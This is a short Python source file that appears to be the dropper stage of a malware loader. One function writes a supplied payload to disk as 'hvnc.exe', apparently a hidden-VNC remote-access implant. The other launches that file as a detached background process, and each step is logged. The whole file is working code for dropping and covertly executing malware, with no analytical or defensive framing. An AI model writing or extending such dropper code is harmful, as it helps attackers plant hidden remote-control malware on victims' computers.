import subprocess

from logger import *

def write_payload(payload):
    log("Writing payload...")
    file_path = "./src/hvnc.exe"
    with open(file_path, "wb") as file:
        file.write(payload)

    return file_path

def run_payload(file):
    log("Starting payload...")
    subprocess.Popen([file], creationflags=0x8) # Detached flags